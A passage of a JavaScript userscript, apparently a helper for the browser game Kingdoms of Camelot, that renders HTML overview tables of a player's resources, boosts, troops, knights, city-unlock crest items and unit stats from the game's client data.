              		  case 'MOUNTAIN' : wildtype = uW.g_js_strings.commonstr.mountain;break;
              		  case 'PLAIN' : wildtype = uW.g_js_strings.commonstr.plain;break;
              		}
              		var grandtotal = 0;
              		for(b=0; b<Cities.numCities; b++) {
              			dat = Seed.wilderness['city'+ Seed.cities[b][0]];
              			if (dat!=null && matTypeof(dat)=='object') for (k in dat) if (dat[k]['tileType'] == uW.cm.WILDERNESS_TYPES[c]) grandtotal++; 
              		}
              		if (grandtotal >0) {
		              		z+='<TR><TD style="background: #FFFFFF">'+wildtype+'</td>';
		              		for(b=0; b<Cities.numCities; b++) {		
		              			var total =0;
		              			dat = Seed.wilderness['city'+ Seed.cities[b][0]];
		              			if (dat!=null && matTypeof(dat)=='object')
		              					for (k in dat)
		              						if (dat[k]['tileType'] == uW.cm.WILDERNESS_TYPES[c])
		              							++total;  
		        				if (total >0) z+='<TD align=right style="background: #FFFFFF">'+total+'</td>';
		        				else z+='<TD style="background: #FFFFFF"></td>';
		        					
		              		}
		              		z+='</tr>';
		      	    }       
              }
             
        var totboosts = false;
        	  var l = Seed.playerEffects;
            for (p in l) if (l[p] > unixTime()) totboosts =true;               
            if (totboosts) {
                z+='</tr><TR><TD colspan="8" style="background: #FFFFFF; border:none">&nbsp;</td> </tr><TR><TD style="background: #F8F8F8"><B>'+uW.g_js_strings.commonstr.boost+':</b></td>';
                for (p in l) {
                   if (p =='r0BstExp' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.resourceinfo['rec'+0]+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='r1BstExp' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.resourceinfo['rec'+1]+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='r2BstExp' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.resourceinfo['rec'+2]+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='r3BstExp' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.resourceinfo['rec'+3]+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='r4BstExp' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.resourceinfo['rec'+4]+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='atkExpire' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.g_js_strings.commonstr.attack+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='defExpire' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.g_js_strings.commonstr.defend+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='loadExpire' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.g_js_strings.modal_barracks_train.load+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='returnExpire' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.g_js_strings.commonstr.returning+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='troopUpkeepReductExp' && l[p] > unixTime()) z+='<TR><TD style="background: #FFFFFF">'+uW.g_js_strings.commonstr.upkeep+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
                   if (p =='fogExpire' && l[p] > unixTime()) z+='<TR ><TD style="background: #FFFFFF">'+uW.itemlist.i10021.name+'</td><TD align=right style="background: #FFFFFF">'+ timestr((l[p] - unixTime())) +'</td></tr>';
               }
            }      
        z+='</table></div>';
      t.Overv.innerHTML = z;
     	t.displayTimer = setTimeout (t.showResources, 1000);  
   },   
      
        
    showTroops : function (){
      var t = Tabs.OverView;
      t.Overv.innerHTML =null;
      t.Overv.style.maxHeight = '600px';
      t.Overv.style.overflowY = 'auto';
     var n = "<DIV class=pdxStat>"+culang.HtroopInfos+"</div><TABLE class=pdxTabOverview cellpadding=0 cellspacing=0><TR valign=top align=right></td><TD colspan='2' id=update align=center style='background: #FFFFFF; border:none; vertical-align:middle'><INPUT id=TEST type=submit value="+uW.g_js_strings.modal_progress_actions.updatestatus+"></td></td>";
           for(i=0; i<Cities.numCities; i++) {
             n += "<TD width=81 style='background: #FFFFFF'><B>"+ Cities.cities[i].name.substring(0,11) +'</b><BR>'+ pdxkoordlink (Cities.cities[i].x, Cities.cities[i].y) +"<BR>"+ uW.provincenames['p'+ Cities.cities[i].provId] +"</td>";
           }
   	  for(a=1;a<13;a++) {
   	        var total=0;
   	        var marching = 0;
   	        var raiding = 0;
   	        var tottraining = 0;
   	        
   	        for(b=0; b<Cities.numCities; b++) {
   	        	   var train = Seed.queue_unt['city' + Seed.cities[b][0]];
   	        	   if (train != []) for (c in train) if (train[c][0] == a) tottraining += parseInt(train[c][1]);
   	        }
   	        if (tottraining > 0) var rowsp = 3; 
   	        else var rowsp = 2; 
   	        n+='<TR><TD rowspan="'+rowsp+'" style="background: #FFFFFF; vertical-align:top;"><img height=25 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_'+a+'_50_s34.jpg></td>';
   	        for(b=0; b<Cities.numCities; b++) total += parseInt(Seed.units['city' + Seed.cities[b][0]]['unt'+a]);
   	        if (total >0) n+='<TD align=right >'+addCommas(total)+'</td>';
   	        else n+='<TD align=right >&nbsp;</td>';
   	        for(b=0; b<Cities.numCities; b++) {
   	        	if (Seed.units['city' + Seed.cities[b][0]]['unt'+a] > 0) n+= '<TD align=right >'+addCommas(Seed.units['city' + Seed.cities[b][0]]['unt'+a])+'</td>';
   	        	else n+='<TD ></td>';
   	        }
   	        n+='</tr><TR><TD style="background: #FFFFFF"><FONT COLOR="686868">'+uW.g_js_strings.commonstr.marching+'</font></td>';
   	        for(b=0; b<Cities.numCities; b++) {
   	        	   marching = 0;
   	        	   raiding = 0;
   	        	   var atkp = Seed.queue_atkp['city' + Seed.cities[b][0]];
   	        	   if (atkp != []){
	   	        	   for (c in atkp){
	   	        	   		if (atkp[c]['marchType'] == 9) raiding += (parseInt(atkp[c]['unit'+a+'Count']) + parseInt(atkp[c]['unit'+a+'Return']));
	   	        	   		else if (atkp[c]['marchType'] != undefined)marching += parseInt(atkp[c]['unit'+a+'Count']);
	   	        	   }
	   	        	   if (marching >0 || raiding > 0) {
	   	        	   		n+= '<TD align=right style="background: #FFFFFF"><FONT COLOR="686868">'+addCommas(marching)+' / ';
	   	        	   		n+= addCommas(raiding)+'</font></td>';
   	        	   	   }
   	        	   	   else n+='<TD style="background: #FFFFFF"></td>';	
   	        	   }
   	        }
   	      if (tottraining >0){
   	        n+='</tr><TR><TD style="background: #FFFFFF"><FONT COLOR="686868">'+uW.g_js_strings.modal_openBarracks.trainingttl+'</font></td>';
   	        for(b=0; b<Cities.numCities; b++) {
   	        	   training = 0;
   	        	   var train = Seed.queue_unt['city' + Seed.cities[b][0]];
   	        	   if (train != []){
	   	        	   for (c in train) if (train[c][0] == a) training += parseInt(train[c][1]);
	   	        	   if (training >0) {
	   	        	   		n+= '<TD align=right style="background: #FFFFFF"><FONT COLOR="686868">'+addCommas(training)+'</font></td>';
   	        	   	   }
   	        	   	   else n+='<TD style="background: #FFFFFF"></td>';	
   	        	   }
   	      }
   	  		n+='</tr>';
   	  	}
   	  }
   	  n+='<TR><TD colspan="8" style="background: #FFFFFF; border:none;">&nbsp;</td> </tr>';
      n+='<TR><TD colspan="2" style="border=solid">'+uW.g_js_strings.openKnights.myknights+':</td>';
      for(b=0; b<Cities.numCities; b++) {
           var knights=0;
           var knightscity = Seed.knights['city' + Seed.cities[b][0]];
           if (knightscity != []) for (c in knightscity) if (knightscity[c]['knightId'] > 0) knights++;
        	 n+= '<TD align=right >'+knights+'</td>';	
      }
      n+='</tr><TR><TD colspan="2" >'+uW.g_js_strings.commonstr.combat+':</td>';
      for(b=0; b<Cities.numCities; b++) {
           var combat=0;
           var knightscity = Seed.knights['city' + Seed.cities[b][0]];
           if (knightscity != []) for (c in knightscity) if (knightscity[c]['combat'] > combat) 
               if (Seed.leaders['city' + Seed.cities[b][0]]['combatKnightId'] != knightscity[c]['knightId'])  combat = knightscity[c]['combat'];
        	 n+= '<TD align=right style="background: #FFFFFF">'+combat+'</td>';	
      }
      
      n+='<TR><TD colspan="8" style="background: #FFFFFF; border:none;">&nbsp;</td> </tr>';
      n+='<TR><TD colspan="2" style="border=solid">'+uW.g_js_strings.modal_barracks_trainingtab.totaltraintime+':</td>';
      for(b=0; b<Cities.numCities; b++) {
           var time=0;
           now = unixTime();
           var  unt = Seed.queue_unt['city' + Seed.cities[b][0]];
           //alert(unt.length);
           if (unt != null && unt.length > 0) time = (unt[unt.length-1][3] - now);
           if (time < 0) time=0;
           if (time < 3600) n+= '<TD align=right ><FONT COLOR=red>'+timestr(time)+'</font></td>';	
           else n+= '<TD align=right >'+timestr(time)+'</td>';	
      }
      
   	  n+='</tr></table>';
   	  t.Overv.innerHTML = n;
   	  
   	  document.getElementById('TEST').addEventListener('click', function(){
   	  		var params = uW.Object.clone(uW.g_ajaxparams);
   	    			new AjaxRequest(uW.g_ajaxpath + "/fb/e2/src/main_src.php?g=&y=0&n=nan001&l=nl_NL&messagebox=&standalone=0&res=1&iframe=1&lang=en&ts=1304248288.7067&s=250&appBar=" + uW.g_ajaxsuffix, {
   	    			    method: "POST",
   	    			    parameters: params,
   	    			    onSuccess: function (rslt) {
   	    			        var mainSrcHTMLCode = rslt.responseText;
   	    			    	var myregexp = /var seed=\{.*?\};/;
   	    			    	var match = myregexp.exec(mainSrcHTMLCode);
   	    			    	if (match != null) {
   	    			    		result = match[0];
   	    			    		result = result.substr(4);
   	    			    		var seed = eval(result);
   	  	  			    		uW.document.seed = seed;
   	  	  			    		Seed = seed;
   	  	  			    		uW.seed = seed;
   	  	  			    		document.getElementById('update').style.background ='#99FF99';
   	  	  			    		setTimeout(function(){ (document.getElementById('update').style.background ='#FFFFF'); }, 1000);
   	    			    	}
   	    			    },
   	    			    onFailure: function () {
   	    			      if (notify != null)
   	    			        notify(rslt.errorMsg);
   	    			    },
   	    			});
   	  	
   	  }, false);
   	    	
      t.displayTimer = setTimeout (t.showTroops, 1000);  
    },
  
  showInfo : function (){
      var t = Tabs.OverView;
      t.Overv.innerHTML = null;
      t.Overv.style.maxHeight = '600px';
      t.Overv.style.overflowY = 'scroll';
      clearTimeout (t.displayTimer);	

	var bor,ector,kay,bedivere,gawain,percival,galahad,lancelot,arthur,morgana,mordred;
	  
	if (Seed.items.i1101){bor=Seed.items.i1101}else{bor=0};
	if (Seed.items.i1102){ector=Seed.items.i1102}else{ector=0};
	if (Seed.items.i1103){kay=Seed.items.i1103}else{kay=0};
	if (Seed.items.i1104){bedivere=Seed.items.i1104}else{bedivere=0};
	if (Seed.items.i1105){gawain=Seed.items.i1105}else{gawain=0};
	if (Seed.items.i1106){percival=Seed.items.i1106}else{percival=0};
	if (Seed.items.i1107){galahad=Seed.items.i1107}else{galahad=0};
	if (Seed.items.i1108){lancelot=Seed.items.i1108}else{lancelot=0};
	if (Seed.items.i1109){arthur=Seed.items.i1109}else{arthur=0};
	if (Seed.items.i1110){morgana=Seed.items.i1110}else{morgana=0};
	if (Seed.items.i1111){mordred=Seed.items.i1111}else{mordred=0};
	if (Seed.items.i1112){Stag=Seed.items.i1112}else{Stag=0};
	if (Seed.items.i1113){Pendragon=Seed.items.i1113}else{Pendragon=0};
	if (Seed.items.i1114){Lady=Seed.items.i1114}else{Lady=0};
	if (Seed.items.i1115){Merlin=Seed.items.i1115}else{Merlin=0};
	if (Seed.items.i1120){aetherseal=Seed.items.i1120}else{aetherseal=0};
	if (Seed.items.i1121){ysbadden=Seed.items.i1121}else{ysbadden=0}; 
	if (Cities.cities[1]){ville2="#ceface";}else{ville2="#fdc1cf";}
	if (Cities.cities[2]){ville3="#ceface";}else{ville3="#fdc1cf";}
	if (Cities.cities[3]){ville4="#ceface";}else{ville4="#fdc1cf";}
   	if (Cities.cities[4]){ville5="#ceface";}else{ville5="#fdc1cf";}
   	if (Cities.cities[5]){ville6="#ceface";}else{ville6="#fdc1cf";}
   	if (Cities.cities[6]){ville7="#ceface";}else{ville7="#fdc1cf";}
   	if (Cities.cities[7]){ville8="#99EE99";}else{ville8="#EE9999";}

	{
	var m = '';
	m += '<STYLE>\
	CAPTION.MYTABLE { background-color:eeffff; color:black; border-style:solid; border-width:1px; border-color:black; }\
	TABLE.MYTABLE { font-family:arial; border-collapse:collapse; font-size:10pt; background-color:F5F5F5; width:100%; border-style:solid; border-color:black; border-width:1px; }\
	TH.MYTABLE { font-size:10pt; color:black; text-align:center; border-style:solid; border-color:black; border-width:1px;}\
	TR.MYTABLE { }\
	TD.MYTABLE { font-size:10pt; background-color:FFFFE5;color:black; border-style:solid; border-width:1px; text-align:left; }\
	.xtabH {background:#ffffe8; border:none; padding-right: 5px; padding-left: 5px; margin-left:10px; }\
	.xtabHL { background:#ffffe8; border-width: 1px; border-style: none none none solid; padding-right:5px; padding-left:5px; margin-left:10px; }\
	.xtabL { background:none; border-width: 1px; border-style: none none none solid; padding-right:5px; padding-left: 5px; margin-left:10px; }\
	.xtabLine { padding:0px; spacing:0px; height:1px; border-color:black; border-width: 1px; border-style: none none solid none }</style>\
		<TABLE CLASS="MYTABLE" CELLPADDING=0 CELLSPACING=0><div CLASS="pdxStat">'+culang.Hcityreq+'</div><THEAD ><TR CLASS="MYTABLE"><TH CLASS="MYTABLE">'+culang.cities+'</TH><TH CLASS="MYTABLE">'+culang.requirement+' 1</TH><TH CLASS="MYTABLE">'+culang.requirement+' 2</TH><TH CLASS="MYTABLE">'+culang.requirement+' 3</TH></TR></THEAD>\
	<TBODY><TR CLASS="MYTABLE"><TD CLASS="MYTABLE" style="background-color:'+ville2+';">'+culang.city+' 2</TD><TD CLASS="MYTABLE" style="background-color:'+ville2+';">'+culang.lvl+' 7 ('+Seed.player.title+')</TD><TD CLASS="MYTABLE" style="background-color:'+ville2+';">10 '+culang.friends+'</TD><TD CLASS="MYTABLE" style="background-color:'+ville2+';">&nbsp;</TD></TR>\
	<TR CLASS="MYTABLE"><TD CLASS="MYTABLE" style="background-color:'+ville3+';">'+culang.city+' 3</TD><TD CLASS="MYTABLE" style="background-color:'+ ( (bor>=4)?"#ceface":ville3 ) +';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1101.jpg>&nbsp;4 '+culang.SirBors+' ('+bor+')</TD><TD CLASS="MYTABLE" style="background-color:'+ ( (ector>=2)?"#ceface":ville3 ) +';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1102.jpg>&nbsp;2 '+culang.SirEctors+' ('+ector+')</TD><TD CLASS="MYTABLE" style="background-color:'+ ( (kay>=1)?"#ceface":ville3 ) +';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1103.jpg>&nbsp;1 '+culang.SirKays+' ('+kay+')</TD></TR>\
	<TR CLASS="MYTABLE"><TD CLASS="MYTABLE" style="background-color:'+ville4+';">'+culang.city+' 4</TD><TD CLASS="MYTABLE" style="background-color:'+( (kay>=4)?"#ceface":ville4 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1103.jpg>&nbsp;4 '+culang.SirKays+' ('+kay+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (bedivere>=3)?"#ceface":ville4 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1104.jpg>&nbsp;3 '+culang.SirBediveres+' ('+bedivere+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (gawain>=1)?"#ceface":ville4 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1105.jpg>&nbsp;1 '+culang.SirGawains+' ('+gawain+')</TD></TR>\
	<TR CLASS="MYTABLE"><TD CLASS="MYTABLE" style="background-color:'+ville5+';">'+culang.city+' 5</TD><TD CLASS="MYTABLE" style="background-color:'+( (percival>=4)?"#ceface":ville5 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1106.jpg>&nbsp;4 '+culang.SirPercivals+' ('+percival+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (galahad>=3)?"#ceface":ville5 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1107.jpg>&nbsp;3 '+culang.SirGalahads+' ('+galahad+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (lancelot>=2)?"#ceface":ville5 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1108.jpg>&nbsp;2 '+culang.SirLancelots+' ('+lancelot+')</TD></TR>\
	<TR CLASS="MYTABLE"><TD CLASS="MYTABLE" style="background-color:'+ville6+';">'+culang.city+' 6</TD><TD CLASS="MYTABLE" style="background-color:'+( (arthur>=4)?"#ceface":ville6 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1109.jpg>&nbsp;4 '+culang.Arthurs+' ('+arthur+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (morgana>=3)?"#ceface":ville6 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1110.jpg>&nbsp;3 '+culang.Morganas+' ('+morgana+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (mordred>=2)?"#ceface":ville6 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1111.jpg>&nbsp;2 '+culang.Mordreds+' ('+mordred+')</TD></TR>\
	<TR CLASS="MYTABLE"><TD CLASS="MYTABLE" style="background-color:'+ville7+';">'+culang.city+' 7</TD><TD CLASS="MYTABLE" style="background-color:'+( (Stag>=4)?"#ceface":ville7 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1112.jpg>&nbsp;4 '+culang.Stags+' ('+Stag+')</TD>	<TD CLASS="MYTABLE" style="background-color:'+( (Pendragon>=3)?"#ceface":ville7 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1113.jpg>&nbsp;3 '+culang.Pendragons+' ('+Pendragon+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (Lady>=2)?"#ceface":ville7 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1114.jpg>&nbsp;2 '+culang.LadyoftheLake+' ('+Lady+')</TD></TR>\
    <TR CLASS="MYTABLE"><TD CLASS="MYTABLE" style="background-color:'+ville8+';">'+culang.city+' 8</TD><TD CLASS="MYTABLE" style="background-color:'+( (Merlin>=4)?"#99EE99":ville8 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1115.jpg>&nbsp;4 '+culang.merlinsseal+' ('+Merlin+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (aetherseal>=3)?"#99EE99":ville8 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1120.jpg>&nbsp;3 '+culang.aetherseal+' ('+aetherseal+')</TD><TD CLASS="MYTABLE" style="background-color:'+( (ysbadden>=2)?"#99EE99":ville8 )+';"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1121.jpg>&nbsp;2 '+culang.ysbaddenseal+'  ('+ysbadden +')</TD></TR>\
	</TBODY></TABLE><div CLASS="pdxStat">'+culang.HcrestOver+'</div><TABLE CLASS="MYTABLE" CELLPADDING=0 CELLSPACING=0><THEAD >\
	<TR CLASS="MYTABLE"><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1101.jpg title="Bors\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1102.jpg title="Ector\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1103.jpg title="Kay\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1104.jpg title="Bedivere\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1105.jpg title="Gawain\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1106.jpg title="Percival\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1107.jpg title="Galahad\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1108.jpg title="Lancelot\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1109.jpg title="Arthur\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1110.jpg title="Morganna\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1111.jpg title="Mordred\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1112.jpg title="Stag\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1113.jpg title="Pendragon\'s"></TH><TH CLASS="MYTABLE"><img width=25 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1114.jpg title="Lady of the Lake">        </TH><TH CLASS="MYTABLE"><img width=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1115.jpg title="Merlin">         </TH><TH CLASS="MYTABLE"><img width=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1120.jpg title="Aetherseal">          </TH><TH CLASS="MYTABLE"><img width=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1121.jpg title="Ysbadden"></TH></TR></THEAD><TR CLASS="MYTABLE"><TD CLASS="MYTABLE"><center><b>'+bor+'</TD><TD CLASS="MYTABLE"><center><b>'+ector+'</TD><TD CLASS="MYTABLE"><center><b>'+kay+'</TD><TD CLASS="MYTABLE"><center><b>'+bedivere+'</TD><TD CLASS="MYTABLE"><center><b>'+gawain+'</TD><TD CLASS="MYTABLE"><center><b>'+percival+'</TD><TD CLASS="MYTABLE"><center><b>'+galahad+'</TD><TD CLASS="MYTABLE"><center><b>'+lancelot+'</TD> <TD CLASS="MYTABLE"><center><b>'+arthur+'</TD><TD CLASS="MYTABLE"><center><b>'+morgana+'</TD><TD CLASS="MYTABLE"><center><b>'+mordred+'</TD><TD CLASS="MYTABLE"><center><b>'+Stag+'</TD><TD CLASS="MYTABLE"><center><b>'+Pendragon+'</TD><TD CLASS="MYTABLE"><center><b>'+Lady+'</TD><TD CLASS="MYTABLE"><center><b>'+Merlin+'</TD><TD CLASS="MYTABLE"><center><b>'+aetherseal+'</TD><TD CLASS="MYTABLE"><center><b>'+ysbadden+'</TD></TR><TR CLASS="MYTABLE"></tr></table>';
	}
	
   fortmight = {u53: "4", u55: "7", u60: "1", u61: "2", u62: "3", };
	      rownum = 0;
			  m += '<DIV class=pdxStat>'+culang.HtroopInfo+'</div><TABLE align=center cellpadding=1 cellspacing=0>\
	          <TR align=center><TD class=xtab></td><TD class=xtabHL colspan=5><B>'+culang.Hcost+'</b></td><TD class=xtabHL colspan=7><B>STATS</b></td><TD class=xtabHL><B>'+culang.stuse+'</b></td></tr>\
	          <TR valign=bottom align=right><TD class=xtab></td><TD class=xtabHL>'+culang.stfood+'</td><TD class=xtabH>'+culang.wood+'</td><TD class=xtabH>'+culang.stone+'</td>\
	          <TD class=xtabH>'+culang.ore+'</td><TD class=xtabH>'+culang.stpop+'</td><TD class=xtabHL>'+culang.might+'</td><TD class=xtabH>Leb</td><TD class=xtabH>'+culang.stack+'</td><TD class=xtabH>'+culang.stdef+'</td><TD class=xtabH>'+culang.stspeed+'</td><TD class=xtabH>'+culang.stdis+'</td><TD class=xtabH>'+culang.load+'</td>\
	          <TD class=xtabHL>'+culang.stfood+'</td></tr>\
	          <TR style="height:1px;"><TD style="padding:0px; spacing:0px; height:1px; border-color:black; border-width: 1px; border-style: none none solid none" colspan=14></td></tr>';
			 
	      for (ui=1; ui<13; ui++){
	        if (++rownum % 2)
	          rsty = '';
	        else
	          rsty = ' style="background: #e8e8e8" ';
	        cost = unsafeWindow.unitcost['unt'+ui];     //  NAME, Food, Wood, Stone, Ore, ?, IdlePop, Time
	        stats = unsafeWindow.unitstats['unt'+ui];   //  Life, Attack, Defense, Speed, Range, Load
	        food = unsafeWindow.unitupkeeps[ui];
	        might = unsafeWindow.unitmight['unt'+ui];
	        m += '<TR '+ rsty +'align=right><TD class=xtab align=left><B>'+ cost[0].substr(0,16) +'</b></td><TD class=xtabL>'+ cost[1] +'</td><TD class=xtab>'+ cost[2] +'</td>\
	            <TD class=xtab>'+ cost[3] +'</td><TD class=xtab>'+ cost[4] +'</td><TD class=xtab>'+ cost[6] +'</td><TD class=xtabL>'+ might +'</td>\
	            <TD class=xtab>'+ stats[0] +'</td><TD class=xtab>'+ stats[1] +'</td><TD class=xtab>'+ stats[2] +'</td><TD class=xtab>'+ stats[3] +'</td>\
	            <TD class=xtab>'+ stats[4] +'</td><TD class=xtab>'+ stats[5] +'</td><TD class=xtabL>'+ food +'</td></tr>';
	  
	      }
	      m += '<TR class=xtabLine><TD colspan=14 class=xtabLine></td></tr>';
	      for (k in uW.fortcost){
	        if (++rownum % 2)
	          rsty = '';
	        else
	          rsty = ' style="background: #e8e8e8" ';
	        cost = unsafeWindow.fortcost[k];     //  NAME, Food, Wood, Stone, Ore, ?, IdlePop, Time
	        fi = k.substring(3);
	        stats = unsafeWindow.fortstats['unt'+fi];   //  Life, Attack, Defense, Speed, Range, Load
	        food = 0;
	        might = fortmight['u'+fi];
	        name = cost[0].replace ('Defensive','');
	        name = name.replace ('Wall-Mounted','');
	        m+= '<TR '+ rsty +'align=right><TD align=left class=xtab><B>'+ name +'</b></td><TD class=xtabL>'+ cost[1] +'</td><TD class=xtab>'+ cost[2] +'</td>\
	            <TD class=xtab>'+ cost[3] +'</td><TD class=xtab>'+ cost[4] +'</td><TD class=xtab>'+ cost[6] +'</td><TD class=xtabL>'+ might +'</td>\
	            <TD class=xtab>'+ stats[0] +'</td><TD class=xtab>'+ stats[1] +'</td><TD class=xtab>'+ stats[2] +'</td><TD class=xtab>'+ stats[3] +'</td>\
	            <TD class=xtab>'+ stats[4] +'</td><TD class=xtab>'+ stats[5] +'</td><TD class=xtabL>'+ food +'</td></tr>';
	      }
	      m += '<TR class=xtabLine><TD colspan=14 class=xtabLine></td></tr>';
	      m += '</table></div>';

	function _displayrow (name, row){
			if (rownum++ % 2)
				style = '';
			else
				style = ' style = "background: #e8e8e8"';
			m += '<TR' + style + '>';
			m += '<TD align=right><B>' + name + '</B></td>';
			for (i=0; i<row.length; i++)
				if (row[i]==0)
					m += '<td align=right><SPAN class=boldRed>0</SPAN></td>';
				else
					m += '<td align=right>'+addCommas(parseInt(row[i]))+'</td>';
			m += '</tr>';
		}
		m += '<DIV class=pdxStat>'+culang.HtrainTime+'</div><BR /><TABLE align=center cellpadding=1 cellspacing=0>\
					<TABLE align=center cellpadding=1 cellspacing=0><TR align=right><TD></td>';
		infoRows = [];
		for (r=0; r<18; r++){
			infoRows[r] = [];
		}
		for(i=0; i<Cities.numCities; i++) {
			cityID = 'city'+ Cities.cities[i].id;
			m += "<TD align=center valign=bottom width=60px><B>";
			m += Cities.cities[i].name.replace(/ /g, "<BR>");
			m += "</B></TD>";
			getTroopTrainEstimates(cityID);
			infoRows[0][i] = numBarracks;
			infoRows[1][i] = totLevelsBarracks;
			infoRows[2][i] = marshallCombatScore;
			infoRows[3][i] = geometryLevel;
			infoRows[4][i] = stableLevel;
			infoRows[5][i] = workshopLevel;
			infoRows[6][i] = rateSupplyTroop;
			infoRows[7][i] = rateMilitiaman;
			infoRows[8][i] = rateScout;
			infoRows[9][i] = ratePikeman;
			infoRows[10][i] = rateSwordsman;
			infoRows[11][i] = rateArcher;
			infoRows[12][i] = rateCavalry;
			infoRows[13][i] = rateHeavyCavalry;
			infoRows[14][i] = rateSupplyWagon;
			infoRows[15][i] = rateBallista;
			infoRows[16][i] = rateBatteringRam;
			infoRows[17][i] = rateCatapult;
		}
		m += "</tr>";
		rownum=0;
		_displayrow (""+culang.barracks+"",   infoRows[0]);
		_displayrow (""+culang.barracks+" Level Gesamt", infoRows[1]);
		_displayrow (""+culang.kntpt+"", infoRows[2]);
		_displayrow (""+culang.geolev+"",       infoRows[3]);
		_displayrow (""+culang.stablelev+"",         infoRows[4]);
		_displayrow (""+culang.workshlev+"",       infoRows[5]);
		m += "<TR><TD nowrap align=center colspan="+(Cities.numCities+1)+"><B>"+culang.trainti+"</u></B></TD>";
		_displayrow (""+culang.supplytroop+"",  infoRows[6]);
		_displayrow (""+culang.militiaman+"",    infoRows[7]);
		_displayrow (""+culang.scout+"",         infoRows[8]);
		_displayrow (""+culang.pikeman+"",       infoRows[9]);
